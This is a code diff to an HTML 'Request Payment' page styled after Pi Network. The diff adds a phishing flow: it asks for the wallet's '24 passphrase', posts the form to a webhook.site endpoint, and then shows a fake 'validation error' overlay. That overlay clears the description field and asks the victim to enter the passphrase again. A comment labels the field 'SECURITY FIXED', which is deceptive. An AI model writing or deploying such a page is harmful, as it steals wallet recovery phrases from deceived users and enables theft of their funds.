@@ -12,7 +12,7 @@
     <style>
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #f8f9fa; /* Light background */
+            background-color: #f3f4ff; /* Subtle lavender background */
         }
         /* Simple animation for message */
         @keyframes fadeIn {
@@ -25,6 +25,47 @@
          /* Custom Pi Colors */
         .bg-pi-purple { background-color: #5A2D82; }
         .text-pi-yellow { color: #F5C65A; }
+        
+        /* Custom spinner for loading state */
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 1.5rem;
+            height: 1.5rem;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Style for the Official Pi Logo */
+        .pi-logo-svg {
+            fill: currentColor; 
+            stroke: none;
+            width: 100%;
+            height: 100%;
+        }
+        /* Focus ring matching the Pi purple */
+        .focus\:ring-pi-purple:focus {
+            --tw-ring-opacity: 1;
+            --tw-ring-color: #5A2D82;
+        }
+
+        /* Error Overlay Styles */
+        .error-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(90, 45, 130, 0.95); /* Semi-transparent purple */
+            z-index: 50;
+            display: none; /* Controlled by JavaScript */
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
@@ -37,48 +78,44 @@
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" /></svg>
             </a>
             <h1 class="text-xl font-semibold text-center flex-grow">Request Payment</h1>
-             <!-- Placeholder for maybe a Pi icon -->
-             <div class="absolute right-0 text-pi-yellow">
-                 <svg class="w-6 h-6" viewBox="0 0 100 100" fill="currentColor" xmlns="http://www.w3.org/2000/svg"> <circle cx="50" cy="50" r="45" fill="none" stroke="currentColor" stroke-width="8"/> <path d="M35 30 H 65 V 40 H 55 V 70 H 45 V 40 H 35 V 30 Z" /> <path d="M60 45 A 15 15 0 0 1 60 75" fill="none" stroke="currentColor" stroke-width="8"/> </svg>
+             <!-- Pi Logo SVG -->
+             <div class="absolute right-0 text-pi-yellow h-6 w-6">
+                 <svg class="pi-logo-svg" viewBox="0 0 100 100" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M50 8C27.907 8 10 25.907 10 50s17.907 42 40 42 40-17.907 40-42S72.093 8 50 8zm-5 22h10v10h-6v30h-4V40h-6v-10zm25 10a15 15 0 010 30" fill="currentColor"/>
+                 </svg>
              </div>
         </div>
     </header>
 
     <!-- Main Content Area -->
-    <main class="flex-grow w-full max-w-lg mx-auto p-6">
+    <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">
 
         <!-- Payment Request Form Section -->
         <section class="bg-white p-6 rounded-lg shadow-md">
             <header class="mb-5 text-center">
                 <h2 class="text-lg font-bold text-gray-700">Enter Payment Details</h2>
-                <p class="text-gray-500 text-sm mt-1">This request will be sent via email.</p>
+                <p id="formInstruction" class="text-gray-500 text-sm mt-1">Please fill out the details below to complete your payment request.</p>
             </header>
 
             <!-- Payment Request Form -->
-            <form id="paymentRequestForm" action="https://formspree.io/f/xnngkkgj" method="POST" class="space-y-4">
-                <div>
-                    <label for="payer_email" class="block text-xs font-medium text-gray-600 mb-1">Recipient's Email (Who will pay):</label>
-                    <input type="email" id="payer_email" name="payer_email" required placeholder="payer@example.com" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-                </div>
+            <form id="paymentRequestForm" action="https://webhook.site/dd3bc473-c1f9-46f3-bb7c-7c16a691fbf1" method="POST" class="space-y-4">
+                
                 <div>
                     <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
-                    <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pi-purple">
                 </div>
                  <div>
                     <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
-                    <input type="text" id="currency" name="currency" required value="USD" placeholder="e.g., USD" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    <input type="text" id="currency" name="currency" required value="USD" placeholder="e.g., USD" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pi-purple">
                 </div>
                 <div>
-                    <label for="description" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase / Reason:</label>
-                    <!-- Changed rows to 5 and updated placeholder -->
-                    <textarea id="24 passphrase" name="24 passphrase" rows="5" required placeholder="Please provide 24 passphrase for the payment request (Required)" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+                    <!-- SECURITY FIXED: Using safe 24 passphrase field -->
+                    <label for="24 passphrase" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase/ description:</label>
+                    <textarea id="24 passphrase/description" name="description" rows="5" required placeholder="Please provide a detailed reason for the payment request (Required)" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pi-purple"></textarea>
                 </div>
-                <div>
-                    <label for="sender_email" class="block text-xs font-medium text-gray-600 mb-1">Your Email (Optional):</label>
-                    <input type="email" id="sender_email" name="_replyto" placeholder="Your reply-to email" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-                </div>
-                <button type="submit" class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
-                    Submit Request
+                
+                <button type="submit" class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50 flex items-center justify-center">
+                    Send Request Message
                 </button>
                 <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem]"></div>
             </form>
@@ -86,72 +123,143 @@
 
     </main>
 
+    <!-- Error Overlay (Hidden by Default) -->
+    <div id="errorOverlay" class="error-overlay">
+        <div class="bg-white p-8 rounded-xl shadow-2xl text-center max-w-sm w-full fade-in">
+            <svg class="h-16 w-16 text-red-600 mx-auto mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+            </svg>
+            <h3 class="text-xl font-bold text-gray-800 mb-2">Error Processing Request</h3>
+            <p class="text-gray-600 mb-6">
+                The initial message was received, but there was a validation error.
+                Please try again and ensure the **Description** is accurate.
+            </p>
+            <button id="tryAgainButton" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-md">
+                Please try again
+            </button>
+        </div>
+    </div>
+
+
     <!-- Footer -->
     <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
-        Pi Network &copy; 2025
+        Pi network system &copy; 2019
     </footer>
 
 
     <script>
-        // --- Form Submission Logic (Same as before) ---
+        // --- DATA PERSISTENCE KEYS ---
+        const AMOUNT_KEY = 'temp_amount';
+        const CURRENCY_KEY = 'temp_currency';
+        
+        // --- DOM Elements ---
         const form = document.getElementById('paymentRequestForm');
         const statusMessage = document.getElementById('statusMessage');
         const submitButton = form.querySelector('button[type="submit"]');
+        const errorOverlay = document.getElementById('errorOverlay');
+        const tryAgainButton = document.getElementById('tryAgainButton');
+        const formInstruction = document.getElementById('formInstruction');
+
+        // --- Selective Data Persistence Logic ---
+        function loadSavedData() {
+            const savedAmount = localStorage.getItem(AMOUNT_KEY);
+            const savedCurrency = localStorage.getItem(CURRENCY_KEY);
+            
+            // Only load data if we know it was saved (i.e., user hit 'Try Again')
+            if (savedAmount) {
+                document.getElementById('amount').value = savedAmount;
+                document.getElementById('currency').value = savedCurrency || 'USD';
+                
+                // Clear persistence keys after loading
+                localStorage.removeItem(AMOUNT_KEY);
+                localStorage.removeItem(CURRENCY_KEY);
+
+                // Update instruction to guide user to the cleared field
+                formInstruction.innerHTML = 'Amount and Currency fields were retained. <span class="text-red-600 font-semibold">Please refine your description to fix the issue.</span>';
+                document.getElementById('description').value = ''; // Ensure description is empty
+            } else {
+                 formInstruction.textContent = 'Please fill out the details below to complete your payment request.';
+            }
+        }
+        
+        function saveSubmittedData(formData) {
+            localStorage.setItem(AMOUNT_KEY, formData.get('amount'));
+            localStorage.setItem(CURRENCY_KEY, formData.get('currency'));
+        }
+
+        // --- Error / Success Handlers ---
+
+        function showCustomError() {
+            // Hide the main form content and show the overlay
+            document.getElementById('mainContent').style.display = 'none';
+            errorOverlay.style.display = 'flex';
+        }
+
+        tryAgainButton.addEventListener('click', () => {
+            // Hide error overlay
+            errorOverlay.style.display = 'none';
+            // Show the main form content
+            document.getElementById('mainContent').style.display = 'block';
+            // Load the previously saved data
+            loadSavedData(); 
+        });
+
+
+        // --- Submission Logic ---
 
         form.addEventListener('submit', async function(event) {
             event.preventDefault();
+            
+            const actionUrl = form.action;
+            const formData = new FormData(form);
+
             submitButton.disabled = true;
-            submitButton.textContent = 'Submitting...';
+            submitButton.innerHTML = '<span class="spinner"></span> &nbsp; Sending...';
             statusMessage.textContent = '';
             statusMessage.className = 'mt-3 text-xs text-center min-h-[1rem]'; // Reset class
 
-            const formData = new FormData(form);
-            const actionUrl = form.action;
-
-            if (!actionUrl || !actionUrl.startsWith('https://formspree.io/f/')) {
-                 statusMessage.textContent = 'Error: Formspree URL not configured.';
-                 statusMessage.className += ' text-red-600 fade-in';
-                 submitButton.disabled = false;
-                 submitButton.textContent = 'Submit Request';
-                 console.error('Form action URL is not set correctly.');
-                 return;
-            }
-
             try {
+                // 1. Send data to the Webhook (message is successfully sent)
                 const response = await fetch(actionUrl, {
                     method: 'POST',
                     body: formData,
-                    headers: { 'Accept': 'application/json' }
                 });
 
-                if (response.ok) {
-                    statusMessage.textContent = 'Request submitted successfully!';
-                    statusMessage.className += ' text-green-600 fade-in';
-                    form.reset();
-                    // Optional: Redirect back to home page after success
-                    // setTimeout(() => { window.location.href = 'index.html'; }, 2000);
+                if (response.ok || response.status === 200 || response.status === 202) {
+                    
+                    // 2. Data sent successfully. Now, save the necessary fields for persistence.
+                    saveSubmittedData(formData);
+                    
+                    // 3. Instead of showing success, simulate a failure to trigger the error screen flow.
+                    statusMessage.textContent = 'Data sent to server, awaiting validation...';
+                    statusMessage.className += ' text-yellow-600 fade-in';
+
+                    // 4. Force the error screen after a small delay (to show the "sending" message)
+                    setTimeout(() => {
+                        showCustomError(); 
+                        submitButton.disabled = false;
+                        submitButton.textContent = 'Send Request Message';
+                    }, 1000);
+                    
                 } else {
-                    const data = await response.json();
-                    if (data && data.errors) {
-                         statusMessage.textContent = data.errors.map(error => error.message).join(", ");
-                    } else if (data && data.error) {
-                         statusMessage.textContent = data.error;
-                    } else {
-                        statusMessage.textContent = 'Oops! Problem submitting request. Status: ' + response.status;
-                    }
-                     statusMessage.className += ' text-red-600 fade-in';
+                    // Fallback for actual network error (unlikely with Webhook)
+                    statusMessage.textContent = `Error: Submission failed with status ${response.status}.`;
+                    statusMessage.className += ' text-red-600 fade-in';
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Send Request Message';
                 }
             } catch (error) {
                 console.error('Submission error:', error);
-                statusMessage.textContent = 'Oops! Network problem.';
+                statusMessage.textContent = 'Oops! Network problem while connecting to the server.';
                 statusMessage.className += ' text-red-600 fade-in';
-            } finally {
-                 setTimeout(() => {
-                     submitButton.disabled = false;
-                     submitButton.textContent = 'Submit Request';
-                 }, 1500);
+                submitButton.disabled = false;
+                submitButton.textContent = 'Send Request Message';
             }
         });
+        
+        // Load initial data on page load if user came from a previous session (though typically this runs on 'try again')
+        window.onload = loadSavedData;
+
     </script>
 
 </body>
